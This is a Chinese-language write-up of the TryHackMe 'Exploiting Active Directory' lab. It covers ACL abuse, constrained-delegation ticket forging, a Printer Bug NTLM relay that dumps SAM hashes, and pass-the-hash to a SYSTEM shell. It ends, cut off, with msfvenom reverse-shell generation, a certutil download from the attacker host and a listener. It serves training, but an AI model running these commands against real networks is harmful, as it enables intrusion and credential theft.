# 前置代理

这个房间我在本地无法直连vpn，需要加前置代理

## ssh
只能转发tcp

ssh动态绑定本地转发端口
```
ssh -N -D 127.0.0.1:9050 root@xxxx
```
在ovpn最前面加这两行
```
socks-proxy 127.0.0.1 9050
route t3.50redlight.com 255.255.255.255 net_gateway
```

# kali配置DNS

配置DNS文件
```
vim /etc/resolv.conf 
```

上面配置文件填入以下内容
```
nameserver 10.200.60.101
nameserver 114.114.114.114
```

重启网络
```
systemctl restart systemd-resolved
```

验证
```
┌──(root💀kali)-[~]
└─# nslookup thmdc.za.tryhackme.loc
Server:         10.200.83.101
Address:        10.200.83.101#53

Name:   thmdc.za.tryhackme.loc
Address: 10.200.83.101

```

# 获取用户凭据

登录```http://distributor.za.tryhackme.loc/creds```生成一个用户登录凭据

```
Your credentials have been generated: Username: max.smith Password: Kdbt1458
```

ssh登录
```
ssh za.tryhackme.loc\\max.smith@thmwrk1.za.tryhackme.loc
```

# Task 2  Exploiting Permission Delegation


ACE

**ForceChangePassword**：我们可以在不知道用户当前密码的情况下设置用户当前密码。
**AddMembers**：我们有能力将用户（包括我们自己的帐户）、组或计算机添加到目标组。
**GenericAll**：我们可以完全控制对象，包括更改用户密码、注册 SPN 或将 AD 对象添加到目标组的能力。
**GenericWrite**：我们可以更新目标对象的任何非保护参数。例如，这可以让我们更新 scriptPath 参数，这将导致脚本在用户下次登录时执行。
**WriteOwner**：我们有能力更新目标对象的所有者。我们可以让自己成为所有者，从而获得对该对象的额外权限。
**WriteDACL**：我们有能力将新的 ACE 写入目标对象的DACL。例如，我们可以编写一个 ACE，授予我们的帐户对目标对象的完全控制权。
**AllExtendedRights**：我们能够针对目标对象执行与扩展 AD 权限相关的任何操作。例如，这包括强制更改用户密码的能力。


thm提供的json我本地无法识别，重新收集一份
```
PS C:\Users\max.smith\Documents> certutil -urlcache -split -f "http://10.50.57.67/SharpHound.exe" SharpHound.exe   
****  Online  ****
  000000  ...
CertUtil: -URLCache command completed successfully.
PS C:\Users\max.smith\Documents> .\SharpHound.exe -c all
-----------------------------------------------
Initializing SharpHound at 9:43 AM on 8/11/2022
-----------------------------------------------

Resolved Collection Methods: Group, Sessions, LoggedOn, Trusts, ACL, ObjectProps, LocalGroups, SPNTargets, Container


[+] Creating Schema map for domain ZA.TRYHACKME.LOC using path CN=Schema,CN=Configuration,DC=ZA,DC=TRYHACKME,DC=LOC 
[+] Cache File not Found: 0 Objects in cache

[+] Pre-populating Domain Controller SIDS
Status: 0 objects finished (+0) -- Using 17 MB RAM
[+] Creating Schema map for domain TRYHACKME.LOC using path CN=Schema,CN=Configuration,DC=TRYHACKME,DC=LOC
Status: 5128 objects finished (+5128 512.8)/s -- Using 58 MB RAM
Enumeration finished in 00:00:10.7635721
Compressing data to .\20220811094325_BloodHound.zip
You can upload this file directly to the UI

SharpHound Enumeration Completed at 9:43 AM on 8/11/2022! Happy Graphing!

PS C:\Users\max.smith\Documents> ls


    Directory: C:\Users\max.smith\Documents


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        8/11/2022   9:43 AM         307482 20220811094325_BloodHound.zip
-a----        8/11/2022   9:42 AM         833536 SharpHound.exe
-a----        8/11/2022   9:43 AM        1092647 Y2Y1YjhlMjMtNjA5Ny00YjA5LWFmOTMtZTc5YjA1NTU3YzNm.bin


```


拷贝回kali
```
┌──(root💀kali)-[~/tryhackme/ExploitingActiveDirectory]
└─# scp za.tryhackme.loc\\max.smith@thmwrk1.za.tryhackme.loc:C:/Users/max.smith/Documents/20220811094325_BloodHound.zip .
za.tryhackme.loc\max.smith@thmwrk1.za.tryhackme.loc's password: 
20220811092711_BloodHound.zip   
```

从本用户到```TIER 2 ADMINS```的一条攻击路径


![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1660208864433.jpg)


本用户（max）属于```Domain users```用户组

```Domain users```用户组可以添加任何成员到```IT SUPPORT```用户组

```IT SUPPORT```用户组可以强制更改用户```T2_HENRY.HARVEY```的密码

用户```T2_HENRY.HARVEY```属于```TIER 2 ADMINS```用户组



首先，将当前账号添加进```IT Support```用户组，然后用Get-ADGroupMember验证添加结果
```
PS C:\> Add-ADGroupMember "IT Support" -Members "max.smith"
PS C:\> Get-ADGroupMember -Identity "IT Support"

...
...
distinguishedName : CN=max.smith,OU=IT,OU=People,DC=za,DC=tryhackme,DC=loc 
name              : max.smith
objectClass       : user
objectGUID        : f0cd5ecd-6a42-4eff-8015-071e1dc3747b
SamAccountName    : max.smith
SID               : S-1-5-21-3885271727-2693558621-2658995185-1142

```


获取"Tier 2 Admins"组成员，看到有t2_henry.harvey的信息
```
PS C:\> Get-ADGroupMember -Identity "Tier 2 Admins"

...
...

distinguishedName : CN=t2_henry.harvey,OU=T2 Admins,OU=Admins,DC=za,DC=tryhackme,DC=loc 
name              : t2_henry.harvey
objectClass       : user
objectGUID        : a3c2db31-6362-4af7-8a3e-20e0c16a664f
SamAccountName    : t2_henry.harvey
SID               : S-1-5-21-3885271727-2693558621-2658995185-4275

```


强制修改密码,报错报Access is denied
```
PS C:\> $Password = ConvertTo-SecureString "max.123456" -AsPlainText -Force 
PS C:\> Set-ADAccountPassword -Identity "t2_henry.harvey" -Reset -NewPassword $Password               
Set-ADAccountPassword : Access is denied 
At line:1 char:1
+ Set-ADAccountPassword -Identity "t2_henry.harvey" -Reset -NewPassword ...
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : PermissionDenied: (t2_henry.harvey:ADAccount) [Set-ADAccountPassword], UnauthorizedA  
   ccessException
    + FullyQualifiedErrorId : ActiveDirectoryCmdlet:System.UnauthorizedAccessException,Microsoft.ActiveDirectory.M  
   anagement.Commands.SetADAccountPassword

```

教程说需要等10分钟断开再连ssh测试,原因是：

> 权限尚未通过域传播。这最多可能需要 10 分钟。最好的方法是终止您的 SSH 或RDP会话，稍作休息，然后重新验证并重试。您也可以运行gpupdate /force然后断开连接并重新连接，这在某些情况下会导致同步发生得更快

几分钟后再次修改，修改成功
```
PS C:\Users\max.smith> $Password = ConvertTo-SecureString "max.123456" -AsPlainText -Force
PS C:\Users\max.smith> Set-ADAccountPassword -Identity "t2_henry.harvey" -Reset -NewPassword $Password
PS C:\Users\max.smith>  

```

现在可以通过```t2_henry.harvey:max.123456```登录ssh
```
┌──(root💀kali)-[~/tryhackme/ExploitingActiveDirectory]
└─# ssh za.tryhackme.loc\\t2_henry.harvey@thmwrk1.za.tryhackme.loc
za.tryhackme.loc\t2_henry.harvey@thmwrk1.za.tryhackme.loc's password: 

Microsoft Windows [Version 10.0.17763.1098]
(c) 2018 Microsoft Corporation. All rights reserved.

za\t2_henry.harvey@THMWRK1 C:\Users\t2_henry.harvey>whoami
za\t2_henry.harvey

za\t2_henry.harvey@THMWRK1 C:\Users\t2_henry.harvey>hostname
THMWRK1

za\t2_henry.harvey@THMWRK1 C:\Users\t2_henry.harvey>

```

> Which ACE would allow you to update any non-protected parameter of a target object?

> GenericWrite

> What is the value of the flag stored on the Desktop of the Administrator user on THMWRK1 (flag1.txt)?

> THM{Permission.Delegation.FTW!}

# Task 3  Exploiting Kerberos Delegation

## 可以委派的服务类型

**HTTP** - Used for web applications to allow pass-through authentication using AD credentials.（用于 Web 应用程序以允许使用 AD 凭据进行直通身份验证）
**CIFS** - Common Internet File System is used for file sharing that allows delegation of users to shares.（通用 Internet 文件系统用于文件共享，允许用户委派共享）
**LDAP** - Used to delegate to the LDAP service for actions such as resetting a user's password.（用于委托 LDAP 服务执行操作，例如重置用户密码）
**HOST** - Allows delegation of account for all activities on the host.(允许为主机上的所有活动委派帐户)
**MSSQL** - Allows delegation of user accounts to the SQL service for pass-through authentication to databases.(允许将用户帐户委派给 SQL 服务，以对数据库进行直通身份验证。)

## 约束委派利用

枚举约束委派
```
PS C:\> Import-Module C:\Tools\PowerView.ps1 
PS C:\> Get-NetUser -TrustedToAuth 


logoncount               : 34
badpasswordtime          : 8/11/2022 1:52:18 PM
distinguishedname        : CN=IIS Server,CN=Users,DC=za,DC=tryhackme,DC=loc
objectclass              : {top, person, organizationalPerson, user}
displayname              : IIS Server
lastlogontimestamp       : 8/11/2022 12:23:51 PM
userprincipalname        : svcIIS@za.tryhackme.loc
name                     : IIS Server
objectsid                : S-1-5-21-3885271727-2693558621-2658995185-6155
samaccountname           : svcIIS
codepage                 : 0
samaccounttype           : USER_OBJECT
accountexpires           : NEVER
countrycode              : 0
whenchanged              : 8/11/2022 11:23:51 AM
instancetype             : 4
usncreated               : 78494
objectguid               : 11e42287-0a25-4d73-800d-b62e2d2a2a4b
sn                       : Server
lastlogoff               : 1/1/1601 12:00:00 AM
msds-allowedtodelegateto : {WSMAN/THMSERVER1.za.tryhackme.loc, WSMAN/THMSERVER1, http/THMSERVER1.za.tryhackme.loc,  
                           http/THMSERVER1}
objectcategory           : CN=Person,CN=Schema,CN=Configuration,DC=tryhackme,DC=loc
dscorepropagationdata    : 1/1/1601 12:00:00 AM
serviceprincipalname     : HTTP/svcServWeb.za.tryhackme.loc
givenname                : IIS
lastlogon                : 8/12/2022 2:26:43 AM
badpwdcount              : 0
cn                       : IIS Server 
useraccountcontrol       : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD, TRUSTED_TO_AUTH_FOR_DELEGATION
whencreated              : 4/27/2022 11:26:21 AM
primarygroupid           : 513
pwdlastset               : 4/29/2022 11:50:25 AM
usnchanged               : 147551

```

 svcIIS 帐户可以委托 THMSERVER1 上的HTTP和 WSMAN 服务


因为上面得到的t2_henry.harvey是本地管理员，可以导出本地哈希密码
```
PS C:\> C:\Tools\mimikatz_trunk\x64\mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53  
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)                   
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )  
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz                   
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com ) 
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/ 

mimikatz # token::elevate 
Token Id  : 0 
User name :   
SID name  : NT AUTHORITY\SYSTEM 

488     {0;000003e7} 1 D 17550          NT AUTHORITY\SYSTEM     S-1-5-18        (04g,21p)       Primary 
 -> Impersonated !                                                                                      
 * Process Token : {0;001c4448} 0 D 2471194     ZA\t2_henry.harvey      S-1-5-21-3885271727-2693558621-2658995185-4275  (12g,24p)       Primary 
 * Thread Token  : {0;000003e7} 1 D 2503814     NT AUTHORITY\SYSTEM     S-1-5-18        (04g,21p)       Impersonation (Delegation)              
                                                                                                                                   
mimikatz # lsadump::secrets                                                                                                        
Domain : THMWRK1 
SysKey : a1403e57976b472bce5f231922ca3942

Local name : THMWRK1 ( S-1-5-21-3226461851-763325627-4205969673 ) 
Domain name : ZA ( S-1-5-21-3885271727-2693558621-2658995185 )
Domain FQDN : za.tryhackme.loc 

Policy subsystem is : 1.18
LSA Key(s) : 1, default {cfcff4be-beab-7d93-cfa3-edb6a9a3bf27}
  [00] {cfcff4be-beab-7d93-cfa3-edb6a9a3bf27} 929bd1cdc726d31f5eea6fa5266a09521afd0be6309a08fd604c9a95c2af4463 

Secret  : $MACHINE.ACC
cur/text: 0FFIKa"c[#L6T>=.s*ZW'Gz04FL&7,"VjxxhLeXqmI\%Q%c..g?=olZZlnTA#J@;*8+&?neR%>l_W!w&.oz@1MDJHs`&suI rmg,g GQsb%),mlWLo?6$kqP
    NTLM:4207d1b7e4b942da2371174b772fdf5e
    SHA1:c67c43d5a5d002f67371024ef1aa22db76ab44db 
old/text: 0FFIKa"c[#L6T>=.s*ZW'Gz04FL&7,"VjxxhLeXqmI\%Q%c..g?=olZZlnTA#J@;*8+&?neR%>l_W!w&.oz@1MDJHs`&suI rmg,g GQsb%),mlWLo?6$kqP
    NTLM:4207d1b7e4b942da2371174b772fdf5e 
    SHA1:c67c43d5a5d002f67371024ef1aa22db76ab44db

Secret  : DefaultPassword
old/text: vagrant

Secret  : DPAPI_SYSTEM
cur/hex : 01 00 00 00 b6 54 c4 83 d9 88 10 f6 ee ae fc b7 ed 2d a2 d6 47 11 3f 8f 4a 6d 7f 72 35 b8 a2 93 3d 5c 5e 3f 03 8d 79 49 90 e7 2e e0  
    full: b654c483d98810f6eeaefcb7ed2da2d647113f8f4a6d7f7235b8a2933d5c5e3f038d794990e72ee0 
    m/u : b654c483d98810f6eeaefcb7ed2da2d647113f8f / 4a6d7f7235b8a2933d5c5e3f038d794990e72ee0 
old/hex : 01 00 00 00 10 4d a3 82 e2 da 30 1f 33 d6 49 a4 c9 81 26 e5 25 59 bb 9f 8a 76 b1 5d 59 c6 87 c6 32 b7 02 0b c1 5b 24 f4 44 d0 74 31  
    full: 104da382e2da301f33d649a4c98126e52559bb9f8a76b15d59c687c632b7020bc15b24f444d07431
    m/u : 104da382e2da301f33d649a4c98126e52559bb9f / 8a76b15d59c687c632b7020bc15b24f444d07431 

Secret  : NL$KM
cur/hex : 10 bb 99 02 da 94 4a 26 cd ad 07 f3 62 64 53 5c a8 12 be e3 16 1f 8f 99 ae ab 97 37 c4 bc ee df 63 7c 2f 6d 07 c5 d9 5e 29 e7 ce ce 48 52 47 19 8a 03 99 ff 9
7 ec 7f 49 a1 79 15 d9 a0 04 ac 58  
old/hex : 10 bb 99 02 da 94 4a 26 cd ad 07 f3 62 64 53 5c a8 12 be e3 16 1f 8f 99 ae ab 97 37 c4 bc ee df 63 7c 2f 6d 07 c5 d9 5e 29 e7 ce ce 48 52 47 19 8a 03 99 ff 9
7 ec 7f 49 a1 79 15 d9 a0 04 ac 58

Secret  : _SC_thmwinauth / service 'thmwinauth' with username : svcIIS@za.tryhackme.loc
cur/text: Password1@

```

明文密码：Password1@



根据上面的明文密码，使用kekeo生成tgt
```
PS C:\> C:\Tools\kekeo\x64\kekeo.exe                                                                                               

  ___ _    kekeo 2.1 (x64) built on Dec 14 2021 11:51:55
 /   ('>-  "A La Vie, A L'Amour"
 | K  |    /* * *
 \____/     Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
  L\_       https://blog.gentilkiwi.com/kekeo                (oe.eo)
                                             with 10 modules * * */

kekeo # tgt::ask /user:svcIIS /domain:za.tryhackme.loc /password:Password1@
Realm        : za.tryhackme.loc (za)
User         : svcIIS (svcIIS)
CName        : svcIIS   [KRB_NT_PRINCIPAL (1)]
SName        : krbtgt/za.tryhackme.loc  [KRB_NT_SRV_INST (2)]
Need PAC     : Yes
Auth mode    : ENCRYPTION KEY 23 (rc4_hmac_nt      ): 43460d636f269c709b20049cee36ae7a
[kdc] name: THMDC.za.tryhackme.loc (auto)
  > Ticket in file 'TGT_svcIIS@ZA.TRYHACKME.LOC_krbtgt~za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi'

```

看见生成了一张tgt

```
TGT_svcIIS@ZA.TRYHACKME.LOC_krbtgt~za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi
```

根据上面的tgt，请求tgs

参数说明
- tgt - 我们提供在上一步中生成的TGT 。
- user - 我们要模拟的用户。由于 t2_ 帐户对工作站具有管理访问权限，因此可以安全地假设 t1_ 帐户对服务器具有管理访问权限，因此请选择您要模拟的 t1_ 帐户。
- service - 我们要使用委托来模拟的服务。我们首先为HTTP服务生成一个 TGS 。然后我们可以为 WSMAN 服务重新运行相同的命令。

```
kekeo # tgs::s4u /tgt:TGT_svcIIS@ZA.TRYHACKME.LOC_krbtgt~za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi /user:t1_trevor.jones /service:htt
p/THMSERVER1.za.tryhackme.loc
Ticket  : TGT_svcIIS@ZA.TRYHACKME.LOC_krbtgt~za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi
  [krb-cred]     S: krbtgt/za.tryhackme.loc @ ZA.TRYHACKME.LOC
  [krb-cred]     E: [00000012] aes256_hmac
  [enc-krb-cred] P: svcIIS @ ZA.TRYHACKME.LOC
  [enc-krb-cred] S: krbtgt/za.tryhackme.loc @ ZA.TRYHACKME.LOC
  [enc-krb-cred] T: [8/12/2022 5:26:27 AM ; 8/12/2022 3:26:27 PM] {R:8/19/2022 5:26:27 AM}
  [enc-krb-cred] F: [40e10000] name_canonicalize ; pre_authent ; initial ; renewable ; forwardable ;
  [enc-krb-cred] K: ENCRYPTION KEY 18 (aes256_hmac      ): cbf2869f6ee1b270c02f3357441243e499dbe707779e9fb3fa2bd540637dfb8a
  [s4u2self]  t1_trevor.jones
[kdc] name: THMDC.za.tryhackme.loc (auto)
[kdc] addr: 10.200.83.101 (auto)
  > Ticket in file 'TGS_t1_trevor.jones@ZA.TRYHACKME.LOC_svcIIS@ZA.TRYHACKME.LOC.kirbi'
Service(s):
  [s4u2proxy] http/THMSERVER1.za.tryhackme.loc
  > Ticket in file 'TGS_t1_trevor.jones@ZA.TRYHACKME.LOC_http~THMSERVER1.za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi'

```

由结果可见生成了两张tgs
```
TGS_t1_trevor.jones@ZA.TRYHACKME.LOC_svcIIS@ZA.TRYHACKME.LOC.kirbi
TGS_t1_trevor.jones@ZA.TRYHACKME.LOC_http~THMSERVER1.za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi
```

用mimikatz导入上面的两张tgs,然后退出mimikatz

```
PS C:\> C:\Tools\mimikatz_trunk\x64\mimikatz.exe                                                                                                                             
  .#####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/
Privilege '20' OK
 
* File: 'TGS_t1_trevor.jones@ZA.TRYHACKME.LOC_http~THMSERVER1.za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi': OK

mimikatz # kerberos::ptt TGS_t1_trevor.jones@ZA.TRYHACKME.LOC_svcIIS@ZA.TRYHACKME.LOC.kirbi

* File: 'TGS_t1_trevor.jones@ZA.TRYHACKME.LOC_svcIIS@ZA.TRYHACKME.LOC.kirbi': OK

mimikatz # exit
Bye!

```


使用klist查看导入的tgs
```
PS C:\> klist
Current LogonId is 0:0x1c4448

Cached Tickets: (2)

        Server: svcIIS @ ZA.TRYHACKME.LOC
        KerbTicket Encryption Type: RSADSI RC4-HMAC(NT)
        Ticket Flags 0x40a10000 -> forwardable renewable pre_authent name_canonicalize
        Start Time: 8/12/2022 5:30:42 (local)
        End Time:   8/12/2022 15:26:27 (local)
        Renew Time: 8/19/2022 5:26:27 (local)
        Session Key Type: RSADSI RC4-HMAC(NT)
        Cache Flags: 0
        Kdc Called:

#1>     Client: t1_trevor.jones @ ZA.TRYHACKME.LOC
        Server: http/THMSERVER1.za.tryhackme.loc @ ZA.TRYHACKME.LOC
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x40a10000 -> forwardable renewable pre_authent name_canonicalize
        Start Time: 8/12/2022 5:30:42 (local)
        End Time:   8/12/2022 15:26:27 (local)
        Renew Time: 8/19/2022 5:26:27 (local)
        Session Key Type: AES-256-CTS-HMAC-SHA1-96
        Cache Flags: 0
        Kdc Called:

```


在当前tgs的上下文中建立一个thmserver1的session
```
PS C:\> New-PSSession -ComputerName thmserver1.za.tryhackme.loc

 Id Name            ComputerName    ComputerType    State         ConfigurationName     Availability
 -- ----            ------------    ------------    -----         -----------------     ------------
  1 WinRM1          thmserver1.z... RemoteMachine   Opened        Microsoft.PowerShell     Available


PS C:\> Enter-PSSession -ComputerName thmserver1.za.tryhackme.loc
[thmserver1.za.tryhackme.loc]: PS C:\Users\t1_trevor.jones\Documents> whoami
za\t1_trevor.jones
[thmserver1.za.tryhackme.loc]: PS C:\Users\t1_trevor.jones\Documents> cd c:/users/administrator/desktop
[thmserver1.za.tryhackme.loc]: PS C:\users\administrator\desktop> ls


    Directory: C:\users\administrator\desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        4/30/2022   2:10 PM             92 flag2.txt

```

flag
```
[thmserver1.za.tryhackme.loc]: PS C:\users\administrator\desktop> type flag2.txt
THM{Constrained.Delegation.Can.Be.Very.Bad} 
```

> Which Kerberos Delegation type allows for delegation of all services?

> Unconstrained Delegation

> Which Kerberos Delegation type allows the service to specify who is allowed to delegate to it?

> Resource-Based Constrained Delegation

> Which Constrained Delegation service allows access to the file system of the system via delegation?

> CIFS

> What is the value of the flag stored in the Desktop directory of the Administrator user on THMSERVER1 (flag2.txt)?

> THM{Constrained.Delegation.Can.Be.Very.Bad}

# Task 4  Exploiting Automated Relays

## The Printer Bug

利用条件

1. A valid set of AD account credentials.（一组有效的 AD 帐户凭据。）
2. Network connectivity to the target's SMB service.（与目标的 SMB 服务的网络连接。）
3. The target host must be running the Print Spooler service.（目标主机必须运行 Print Spooler 服务。）
4. The hosts must not have SMB signing enforced.（主机不得强制执行 SMB 签名。）


WMI 查询目标主机有没有开启Print Spooler 服务。

```
PS C:\> hostname
THMWRK1
PS C:\> GWMI Win32_Printer -Computer thmserver2.za.tryhackme.loc 


Location      :  
Name          : Microsoft XPS Document Writer
PrinterState  : 0
PrinterStatus : 3
ShareName     :
SystemName    : THMSERVER2

Location      :
Name          : Microsoft Print to PDF
PrinterState  : 0
PrinterStatus : 3
ShareName     :
SystemName    : THMSERVER2

```

## SMB Signing（SMB 签名）

nmap扫描 thmserver1.za.tryhackme.loc thmserver2.za.tryhackme.loc两台主机是否开启了smb强制签名

```
┌──(root💀kali)-[~/tryhackme/ExploitingActiveDirectory]
└─# nmap --script=smb2-security-mode -p445 thmserver1.za.tryhackme.loc thmserver2.za.tryhackme.loc
Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-12 02:26 EDT
Nmap scan report for thmserver1.za.tryhackme.loc (10.200.60.201)
Host is up (0.58s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required

Nmap scan report for thmserver2.za.tryhackme.loc (10.200.83.202)
Host is up (0.33s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required

Nmap done: 2 IP addresses (2 hosts up) scanned in 18.92 seconds

```

显示Message signing enabled but not required，表示开启了smb，但未强制签名

所有条件满足

执行攻击：

1. kali开启ntlmrelayx监听，smb参数里的IP是我们需要收集哈希信息的IP，即THMSERVER1。注意，这里如果填域名的话会走kerberos认证，填IP才会走NTLM认证，所以必须填IP

```
python3 /usr/share/doc/python3-impacket/examples/ntlmrelayx.py -t smb://10.200.60.201 -smb2support -debug
```

2. 在THMWRK1上触发SMB流量,最后那个IP是我们kali的IP地址

```
PS C:\tools> .\SpoolSample.exe THMSERVER2.za.tryhackme.loc 10.50.57.67
[+] Converted DLL to shellcode
[+] Executing RDI
[+] Calling exported function
TargetServer: \\THMSERVER2.za.tryhackme.loc, CaptureServer: \\10.50.57.67
Target server attempted authentication and got an access denied.  If coercing authentication to 
an NTLM challenge-response capture tool(e.g. responder/inveigh/MSF SMB capture), this is expecte
d and indicates the coerced authentication worked.

```

3. ntlmrelayx收到smb流量

```
┌──(root💀kali)-[~/tryhackme/ExploitingActiveDirectory]
└─# python3 /usr/share/doc/python3-impacket/examples/ntlmrelayx.py -t smb://10.200.60.201 -smb2support -debug
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

[+] Impacket Library Installation Path: /usr/local/lib/python3.9/dist-packages/impacket
[*] Protocol Client SMB loaded..
[*] Protocol Client RPC loaded..
[*] Protocol Client IMAP loaded..
[*] Protocol Client IMAPS loaded..
[*] Protocol Client DCSYNC loaded..
[*] Protocol Client LDAPS loaded..
[*] Protocol Client LDAP loaded..
[*] Protocol Client HTTP loaded..
[*] Protocol Client HTTPS loaded..
[*] Protocol Client MSSQL loaded..
[*] Protocol Client SMTP loaded..
[+] Protocol Attack HTTP loaded..
[+] Protocol Attack HTTPS loaded..
[+] Protocol Attack MSSQL loaded..
[+] Protocol Attack LDAP loaded..
[+] Protocol Attack LDAPS loaded..
[+] Protocol Attack DCSYNC loaded..
[+] Protocol Attack IMAP loaded..
[+] Protocol Attack IMAPS loaded..
[+] Protocol Attack SMB loaded..
[+] Protocol Attack RPC loaded..
[*] Running in relay mode to single host
[*] Setting up SMB Server
[*] Setting up HTTP Server
[*] Setting up WCF Server

[*] Servers started, waiting for connections
[*] SMBD-Thread-4: Connection from ZA/THMSERVER2$@10.200.83.202 controlled, attacking target smb://10.200.60.201
[*] Authenticating against smb://10.200.60.201 as ZA/THMSERVER2$ SUCCEED
[+] No more targets for user ZA/THMSERVER2$
[*] SMBD-Thread-4: Connection from ZA/THMSERVER2$@10.200.83.202 controlled, but there are no more targets left!
[*] Service RemoteRegistry is in stopped state
[*] Starting service RemoteRegistry
[+] Retrieving class info for JD
[+] Retrieving class info for Skew1
[+] Retrieving class info for GBG
[+] Retrieving class info for Data
[*] Target system bootKey: 0x4e05e7ea4fdddde75aa56010474948dc
[+] Saving remote SAM database
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
[+] Calculating HashedBootKey from SAM
[+] NewStyle hashes is: True
ServerAdmin:500:aad3b435b51404eeaad3b435b51404ee:3279a0c6dfe15dc3fb6e9c26dd9b066c:::
[+] NewStyle hashes is: True
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[+] NewStyle hashes is: True
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[+] NewStyle hashes is: True
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:92728d5173fc94a54e84f8b457af63a8:::
[+] NewStyle hashes is: True
vagrant:1000:aad3b435b51404eeaad3b435b51404ee:e96eab5f240174fe2754efc94f6a53ae:::
[+] NewStyle hashes is: True
trevor.local:1001:aad3b435b51404eeaad3b435b51404ee:43460d636f269c709b20049cee36ae7a:::
[*] Done dumping SAM hashes for host: 10.200.60.201
[*] Stopping service RemoteRegistry

```

可以看到已经打印出THMSERVER1的sam数据库里的哈希信息

```
ServerAdmin:500:aad3b435b51404eeaad3b435b51404ee:3279a0c6dfe15dc3fb6e9c26dd9b066c:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:92728d5173fc94a54e84f8b457af63a8:::
vagrant:1000:aad3b435b51404eeaad3b435b51404ee:e96eab5f240174fe2754efc94f6a53ae:::
trevor.local:1001:aad3b435b51404eeaad3b435b51404ee:43460d636f269c709b20049cee36ae7a:::
```


pth 拿到flag

```
┌──(root💀kali)-[~/tryhackme/ExploitingActiveDirectory]
└─# python3 /usr/share/doc/python3-impacket/examples/psexec.py  -hashes "aad3b435b51404eeaad3b435b51404ee:3279a0c6dfe15dc3fb6e9c26dd9b066c" ServerAdmin@10.200.60.201                                                                   1 ⨯
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

[*] Requesting shares on 10.200.60.201.....
[*] Found writable share ADMIN$
[*] Uploading file FvdiIslE.exe
[*] Opening SVCManager on 10.200.60.201.....
[*] Creating service Yzmr on 10.200.60.201.....
[*] Starting service Yzmr.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.1098]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system

C:\Windows\system32> hostname
THMSERVER1

C:\Windows\system32> cd c:/users/Administrator.ZA/desktop
 
c:\Users\Administrator.ZA\Desktop> dir
 Volume in drive C is Windows
 Volume Serial Number is 1634-22A9

 Directory of c:\Users\Administrator.ZA\Desktop

2022/05/01  15:49    <DIR>          .
2022/05/01  15:49    <DIR>          ..
2022/05/01  15:50                25 flag3.txt
               1 File(s)             25 bytes
[-] Decoding error detected, consider running chcp.com at the target,
map the result with https://docs.python.org/3/library/codecs.html#standard-encodings
and then execute smbexec.py again with -codec and the corresponding codec
               2 Dir(s)  50�903�248�896 bytes free


c:\Users\Administrator.ZA\Desktop> type flag3.txt
THM{Printing.Some.Shellz}

```


> How often (in days) are the passwords of Windows machine accounts rotated by default?

> 30

> What should not be enforced if we want to relay an SMB authentication attempt?

> SMB Signing

> What is the value of the flag stored in the Desktop directory of the Administrator.ZA user on THMSERVER1 (flag3.txt)?

> THM{Printing.Some.Shellz}


# Task 5  Exploiting AD Users

在THMSERVER1的trevor.local用户文档里找到一个keepass文件
```
c:\Users\t1_trevor.jones\Documents> dir
 Volume in drive C is Windows
 Volume Serial Number is 1634-22A9

 Directory of c:\Users\t1_trevor.jones\Documents

2022/04/30  16:36    <DIR>          .
2022/04/30  16:36    <DIR>          ..
2022/04/30  16:36             2�190 PasswordDatabase.kdbx

```

编译一个meterpreter
```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.50.57.67 LPORT="4444" -f exe -o shell.exe
```


传到靶机
```
certutil.exe -urlcache -split -f http://10.50.57.67/shell.exe
```

监听
```
msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST 10.50.57.67; set LPORT '4444'; exploit"
```

执行触发，收到rev shell
```
